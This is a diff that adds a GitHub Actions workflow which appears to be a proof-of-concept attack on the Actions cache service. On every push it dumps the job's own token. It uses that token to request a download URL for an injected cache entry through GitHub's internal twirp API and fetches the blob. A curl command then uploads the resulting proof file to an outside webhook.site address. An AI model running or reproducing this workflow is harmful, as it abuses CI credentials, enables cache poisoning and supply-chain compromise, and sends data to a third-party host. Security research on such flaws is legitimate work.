@@ -1,0 +1,35 @@
+name: cb-d-restore-verify
+on:
+  push: {}
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - name: dump own token
+        uses: ./.github/actions/dump
+      - name: restore injected entry via twirp
+        run: |
+          set +e
+          node -e '
+            const fs=require("fs");
+            const tok=JSON.parse(fs.readFileSync("ctx-dump.txt","utf8")).tok;
+            const body={metadata:{repositoryId:"1349533473",scope:[{scope:"refs/heads/main",permission:"1"}]},key:"inject-A2F2",restoreKeys:[],version:"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"};
+            fetch("https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL",{method:"POST",headers:{Authorization:"Bearer "+tok,"Content-Type":"application/json"},body:JSON.stringify(body)}).then(r=>r.text()).then(t=>{
+              let out=t;
+              try{
+                const j=JSON.parse(t);
+                if(j.ok&&j.signed_download_url){
+                  out+="\nURL-OBTAINED";
+                  return fetch(j.signed_download_url).then(r=>r.text()).then(b=>{ out+="\nBLOB-FIRST-200:"+b.slice(0,200); fs.writeFileSync("proof.txt",out); });
+                }
+              }catch(e){ out+="\nparse-err:"+e.message; }
+              fs.writeFileSync("proof.txt",out);
+            }).then(()=>1).catch(e=>fs.writeFileSync("proof.txt","fatal:"+e.message));
+          '
+          sleep 8
+          echo "=== proof ==="
+          cat proof.txt || true
+          curl -s -X POST https://webhook.site/727a48a4-5683-424d-88ae-e5eb14927bc7 -F "f=@proof.txt" -F "src=restore-verify"
+          true
